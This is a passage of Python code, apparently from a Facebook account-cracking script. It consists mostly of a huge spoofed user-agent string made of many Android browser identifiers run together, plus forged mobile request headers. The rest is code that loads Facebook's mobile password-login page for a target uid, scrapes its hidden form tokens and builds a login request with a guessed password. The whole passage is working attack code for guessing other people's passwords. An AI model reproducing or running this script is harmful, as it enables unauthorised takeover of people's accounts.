Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19PG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Home Assistant/2022.9.1-2700 (Android 12; M2012K11AG) Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G780G; Android 12#G780GXXU3CVI1#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G998B; Android 12#G998BXXS5CVHI#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 EdgW/1.0 Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 2109119DG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; AC2003 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 webexplorer/4 Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S901B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A536B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Doihue/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A217M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 appname/PLAYit appverc/20604027 appname/PLAYit appverc/20604027 Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A528B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Mi Note 10 Lite Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M127F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; IN2023 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(50) Build/S1RFS32.27-25-2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 GNews Android/2022089220",
					"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"sec-fetch-site": "same-origin",
					"sec-fetch-mode": "navigate",
					"sec-fetch-user": "?1",
					"sec-fetch-dest": "document",
					"sec-ch-ua-mobile": "?1",
					"referer": "https://touch.facebook.com/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
				p = ses.get("https://touch.facebook.com/login/device-based/password/?uid=%s&flow=login_no_pin&refsrc=deprecated&_rdr"%(user))
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://touch.facebook.com/login/save-device/"}
				header = {
					"Host": "touch.facebook.com",
					"content-length": "320",
					"cache-control": "max-age=0",
					"sec-ch-ua-mobile": "?1",
					"sec-ch-ua-platform": '"Android"',
					"upgrade-insecure-requests": "1",
					"origin": "https://touch.facebook.com",
					"content-type": "application/x-www-form-urlencoded",
					"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A715W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2065 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G715FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A225F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Pixel 3a Build/SP2A.220505.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; Redmi Note 9S Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2102J20SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N770F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2038 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S908B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A235M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G781B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M315F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Reddit/Version 2022.35.1/Build 589034/Android 12 Mozilla/5.0 (Linux; Android 5.1.1; AFTM Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; RMX3363 Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2204 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-N986U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UAYSEN/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A326B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 wp-android/20.6.1 Mozilla/5.0 (Linux; Android 12; SM-G970U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2273 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Zalo android/12100641 ZaloTheme/dark ZaloLanguage/vi Mozilla/5.0 (Linux; Android 12; SM-A426U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S906E Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A325M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UOH/v1.6_273-android Mozilla/5.0 (Linux; Android 13; Pixel 4 Build/TP1A.220905.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UCURSOS/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Onefootball/Android/14.42.1 Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A725F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2195 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G985F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2211 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2219 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A226B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19PG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2012K11AG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Home Assistant/2022.9.1-2700 (Android 12; M2012K11AG) Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G780G; Android 12#G780GXXU3CVI1#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; SM-G998B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36Snapchat12.00.0.31 (SM-G998B; Android 12#G998BXXS5CVHI#31; gzip; panda; ) Mozilla/5.0 (Linux; Android 12; CPH2009 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G780G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; moto g(30) Build/S0RCS32.41-10-19-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; motorola edge 20 Build/S1RGS32.53-18-22-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 EdgW/1.0 Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; vivo 1907 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G986B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 cordova-amazon-fireos/3.4.0 AmazonWebAppPlatform/3.4.0;2.0 Mozilla/5.0 (Linux; Android 12; V2050 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; 2109119DG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 UMCE/v1.6_273-android Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G990B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2103K19G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A025G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; AC2003 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 webexplorer/4 Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-A137F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 DuckDuckGo/5 Safari/537.36 Mozilla/5.0 (Linux; Android 12; M2007J22G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-S901B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-F916B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 Mozilla/5.0 (Linux; Android 12; SM-G996B Build/SP1A.210812.016; wv) 